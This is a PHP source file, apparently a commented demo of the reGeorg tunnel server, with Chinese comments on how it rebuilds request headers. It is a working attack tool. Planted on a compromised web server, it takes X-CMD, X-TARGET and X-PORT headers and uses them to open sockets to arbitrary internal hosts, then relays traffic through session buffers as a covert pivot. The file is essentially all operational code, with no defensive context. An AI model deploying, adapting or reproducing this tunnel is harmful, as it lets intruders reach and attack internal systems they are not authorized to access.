<?php
// this is reGeorg PHP'server demo  
//  this is available



ini_set('allow_url_open', true);
ini_set('allow_url_include', true);
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {          # 获取apache_request_headers方法
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {			# 此处的处理方法无非是，将$_SERVER进行了一次处理，将_替换为了-，因为PHP接收请求头字段中的-会解析为_
                    foreach($rx_matches as $ak_key => $ak_val) {					# 然后以_为分割符打散为数组。然后进行将数组每个首字母进行大写的设置。最后再拼接起来
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}


if ($_SERVER['REQUEST_METHOD'] == 'GET'){
    exit("Georg says, 'All seems fine'");
}
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
    set_time_limit(0);                      # 让php页面脱离执行时间的限制
    $headers = apache_request_headers();
    $action = $headers['X-CMD'];
    // echo "\$action is".$action;
    // var_dump($headers);
    switch ($action){
        case "CONNECT":
            {
                $target = $headers['X-TARGET'];
                $port = (int)$headers['X-PORT'];

                $res = fsockopen($target, $port);
                if ($res == false){
                    header('X-STATUS: FAIL');
                    header('X-ERROR: connect to target is error');
                    return;
                }

                stream_set_blocking($res,0);
                @session_start();
                $_SESSION['run'] = true;
                $_SESSION['readbuf'] = '';
                $_SESSION['writebuf'] = '';
                ob_end_clean();
                header('X-STATUS: OK');
                header('Connection: close');
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
                session_write_close();
                


                while($_SESSION['run']){
                    
                    $readBuf = '';
                    @session_start();
                    $writeBuf = $_SESSION['writebuf'];
                    $_SESSION['writebuf'] = '';
                    session_write_close();
                    if ($writeBuf != ''){

                        stream_set_blocking($res,0);
                        $i = fwrite($res,$writeBuf);
                        if ($i === false){

                            @session_start();
                            $_SESSION['run'] = false;
                            session_write_close();
                            header('X-STAUTS: FAIL');
                            header('X-ERROR: the socks write to target is error');
                        }
                    }

                    stream_set_blocking($res,0);
                    while ($out = fgets($res,10)){
                        if($out === false){
                            @session_start();
                            $_SESSION['run']= false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: the read socks is error');
                        }

                        $readBuf .= $out;
                    }

                    if ($readBuf != ''){
                        @session_start();
                        $_SESSION['readbuf'] .= $readBuf;
                        session_write_close();
                    }
                }
                fclose($res);

            fwrite(fopen('a.txt','a'),"close\n");
            }
        break;
        
        case "READ":
        {
            @session_start();
            $readBufer = $_SESSION['readbuf'];
            $_SESSION['readbuf'] = '';
            $running = $_SESSION['run'];
            session_write_close();
            if ($running){
                header("X-STATUS: OK");
                header("Connection: Keep-Alive");
                echo $readBufer;
                return;
            }else{
                header("X-STATUS: FAIL");
                header("X-ERROR: the server is not running");
                return;
            }
        }

        break;

        case "FORWARD":
            {
                @session_start();
                $is_running = $_SESSION['run'];
                session_write_close();
                if(!$is_running){
                    header('X-STATUS: FAIL');
                    header("X-ERROR: FORWARD the server is not running");
                    return;
                }

                header("Content-Type: application/octet-stream");
                $raw_data = file_get_contents('php://input');
                if($raw_data){
                    @session_start();
                    $_SESSION['writebuf'] .= $raw_data;
                    session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
                    return;
                }else{
                    header("X-STATUS: FAIL");
                    header("X-ERROR: the post data is not recv");
                }
            }
        break;

        case "DISCONNECT":
            {
                @session_start();
                $_SESSION['run'] = false;
                session_write_close();
                header('X-STATUS: FAIL');
                header('X-ERROR: connect is over close the server');
                return;
            }
        break;
    }





}




?>